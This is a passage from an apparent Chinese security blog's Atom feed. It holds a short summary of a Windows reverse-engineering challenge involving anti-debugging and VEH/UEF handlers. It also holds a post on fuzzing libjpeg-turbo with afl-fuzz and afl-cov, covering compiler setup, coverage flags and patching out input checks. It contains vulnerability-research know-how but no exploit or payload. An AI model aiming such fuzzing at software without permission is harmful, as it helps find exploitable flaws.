    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;这道题先不说算法，技术层面上就很有意思，反调试函数，硬件断点设置，以及VEH,UEF设置和注册都是借助GetProcAddress函数完成的，导致从import表无法查找到相关函数信息，有关VEH和UEF的相关知识可以看下大佬的这篇文章&lt;</summary>
      
    
    
    
    <category term="windows-reverse" scheme="http://yoursite.com/categories/windows-reverse/"/>
    
    
    <category term="anti-debug" scheme="http://yoursite.com/tags/anti-debug/"/>
    
    <category term="魔改base64" scheme="http://yoursite.com/tags/%E9%AD%94%E6%94%B9base64/"/>
    
    <category term="UEF" scheme="http://yoursite.com/tags/UEF/"/>
    
    <category term="VEH" scheme="http://yoursite.com/tags/VEH/"/>
    
    <category term="RSA" scheme="http://yoursite.com/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>深度fuzz:afl-fuzz+cov</title>
    <link href="http://yoursite.com/2020/08/29/afl-fuzz-cov/"/>
    <id>http://yoursite.com/2020/08/29/afl-fuzz-cov/</id>
    <published>2020-08-29T11:35:18.886Z</published>
    <updated>2020-09-07T03:12:55.954Z</updated>
    
    <content type="html"><![CDATA[<p>上周临时接了老师的安排要对libjpeg-turbo这个软件进行深度fuzz，相比于常规的fuzz（丢入种子，就在那等crash），还要求对fuzz过程中对代码覆盖率尽可能的高，以提升爆出crash的可能性。这就需要将afl-fuzz与代码覆盖率工具afl-cov结合使用起来，通过对fuzz过程未能执行的代码进行分析，对于限制种子通行一些无关的判断（如种子格式，大小等）通过修改源码的方式直接跳过。一下就以libjpeg软件为例，中间也会穿插下编译方面的小知识做下深度fuzz的过程解读。</p><p>libjpeg-turbo是一个图像处理软件，里面有很多的库是被一些著名大型软件调用的如google浏览器，火狐浏览器等，因此如果能爆出它动态链接库的洞em……（我也只是想想）。</p><p>先从编译开始说起吧，一般利用afl-fuzz首先都必须拿到目标源码利用afl专门的编译器afl-gcc，afl-g++进行编译，而一般在Linux里工程工程类源码都自带configure或CMakeLists.txt批处理编译文件，但一般这些文件的都指定编译器为gcc，g++，就需要对环境变量进行修改。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export CC&#x3D;afl-gcc；export CXX&#x3D;afl-g++</span><br></pre></td></tr></table></figure><p>然后./configure文件或者执行cmake命令就可以产生makefile了。</p><p>afl-cov是一个方便观察fuzz过程中执行过的C语句的一款插件，使用的话<a href="https://github.com/mrash/afl-cov">https://github.com/mrash/afl-cov</a> 上有，和样例不同的是，目标如果是工程类文件需要在执行cmake时加上-DCMAKE_C_FLAGS=”-fprofile-arcs -ftest-coverage”，configure文件则需加上CFLAGS=”fprofile-arcs -ftest-coverage”，注意这个编译用的是gcc编译器，启动afl-cov的话里面它的–coverage-cmd的内容还需要根据你的种子输入方式来设置，如果是命令行输入则需要加上cat AFL_FILE|”目标文件执行命令”，如果是文件输入则不需要加上，这里小编在命令执行的过程中也出现了些问题lcov: ERROR: no valid records found in tracefile，后面查找了相关资料发现是因为gcc版本的问题，当小编用gcc&lt;8的版本就能执行成功了。</p><p>后续的话，就可以路径分析了。</p><p><img src="/2020/08/29/afl-fuzz-cov/1597665140917.png" alt="1597665140917"></p><p><img src="/2020/08/29/afl-fuzz-cov/1597665214580.png" alt="1597665214580"></p><p>深度fuzz其实也需要对源码的修改，但这种修改只能基于对一些因为种子的内容导致一些文件检测，校验判断不能通过导致不能深度执行，但不能修改其和内存有关的语句。如果能产生crash，可以反过来修改文件内容从过通过这些判断，可以真正产生crash，后续小编也会尝试这种操作，看能否提高crash的触发概率。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;上周临时接了老师的安排要对libjpeg-turbo这个软件进行深度fuzz，相比于常规的fuzz（丢入种子，就在那等crash），还要求对fuzz过程中对代码覆盖率尽可能的高，以提升爆出crash的可能性。这就需要将afl-fuzz与代码覆盖率工具afl-cov结合使用起</summary>
      
    
    
    
    
    <category term="afl-fuzz" scheme="http://yoursite.com/tags/afl-fuzz/"/>
    
    <category term="afl-cov" scheme="http://yoursite.com/tags/afl-cov/"/>
    
    <category term="cmake" scheme="http://yoursite.com/tags/cmake/"/>
    
  </entry>
  
</feed>
